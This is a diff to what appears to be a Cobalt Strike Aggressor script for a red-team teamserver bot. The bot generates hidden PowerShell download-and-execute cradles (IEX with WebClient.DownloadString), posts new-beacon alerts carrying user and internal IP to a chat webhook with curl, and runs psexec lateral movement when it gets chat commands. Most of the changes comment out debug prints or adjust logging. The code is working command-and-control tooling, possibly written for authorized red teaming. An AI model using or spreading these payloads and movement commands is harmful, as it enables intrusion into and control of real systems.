@@ -50,7 +50,7 @@ sub getDownloadString {
             $downloadString = "powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('";
             $downloadString .= $url . "'))\"";
 
-            println("Returning DownloadString: $downloadString");
+            # println("Returning DownloadString: $downloadString");
             say("Found Powershell DownloadString payload: \c9$downloadString\c0");
             return true;
         }
@@ -63,7 +63,7 @@ sub createDownloadString {
     local ('$listener $script $host $url');
 
     if (-istrue getDownloadString()){
-        println("DownloadString already exists!");
+        # println("DownloadString already exists!");
         return;
     }
     else {
@@ -82,7 +82,7 @@ sub createDownloadString {
         $downloadString = "powershell.exe -nop -w hidden -c \"IEX ((New-Object Net.WebClient).DownloadString('";
         $downloadString .= $url . "'))\"";
 
-        println("Returning DownloadString $downloadString");
+        # println("Returning DownloadString $downloadString");
         say("Here's your DownloadString: \c9$downloadString\c0");
     }
 }
@@ -92,7 +92,7 @@ sub getVersion {
     local ('$bid $version $winver');
 
     $bid = $1;
-    $version = beacon_data($bid)['ver'];
+    $version = binfo($bid, 'ver');
 
     if ($version eq "6.1") {
         $winver = "Win7 or 2008";
@@ -124,20 +124,20 @@ sub notifyBeacon {
 
     # Text file with Flowdock URL containing API key for authentication
     $url = readln(openf("CHANGEME.TXT"));
-    println($url);
+    # println($url);
 
     $msg = " @team New Beacon: " . $bUser . "@" . $bIntIP . " (". $bName . ")";
-    println($msg);
+    # println($msg);
 
     # Codename to tag message with
     $codename = "GREENBEAN";
 
     # Build our curl command
     @cmd = @('curl', '-X', 'POST', '-F', 'event=message', '-F', 'content=' . $msg, '-F', 'tags=C2,' . $codename, $url);
-    println(@cmd);
+    # println(@cmd);
 
     # Run our curl command and get the output
-    println(readAll(exec(@cmd)));
+    # println(readAll(exec(@cmd)));
 }
 
 # Triggered whenever user joins the teamserver
@@ -148,14 +148,15 @@ on event_join {
 
 # Triggered on all public events in the event log
 on event_public {
+    local('@input $cmd @args')
     if (substr($2, 0, 1) eq "!") { # If first character is !, it's a command
         @input = split(" ", $2); # Split incoming command on spaces
         $cmd = @input[0]; # Command is !<cmd> arg1 arg2...
         @args = sublist(@input, 1); # sublist gets everything after !cmd
 
         # Log to script console for debug purposes
-        println("Command received: $cmd");
-        println("Arguments: " . @args);
+        # println("Command received: $cmd");
+        # println("Arguments: " . @args);
         # Play ping pong
         if ($cmd eq "!ping") {
             say("pong!");
@@ -181,9 +182,9 @@ on event_public {
                 $listener = @args[2];
 
                 # Log to script console for debug purposes
-                println("Beacon ID: $bid");
-                println("Target: $target");
-                println("Listener: $listener");
+                # println("Beacon ID: $bid");
+                # println("Target: $target");
+                # println("Listener: $listener");
 
                 psexecTarget($bid, $target, $listener);
             }
@@ -268,7 +269,7 @@ on beacon_initial {
         say("\c5New admin beacon: \c2" . $b['user'] . "@" . $b['computer'] . "\c5!");
     }
 
-    # Get Windows version and set Beacon note.
+    # Get Windows version and set Beacon note
     getVersion($1);
 
     # If notifications are turned on, notify when we get a new beacon
@@ -277,7 +278,13 @@ on beacon_initial {
     }
 }
 
-# Log all beacon tasks to event log for debugging purposes
+# Log all beacon tasks to event log for situational awareness
 on beacon_tasked {
-    elog("Beacon $1 tasked: $2");
+    local('$bid $hostname $user');
+
+    $bid = $1;
+    $hostname = binfo($bid, 'computer');
+    $user = binfo($bid, 'user');
+
+    elog($user . "@" . $hostname . " tasked: $2");
 }
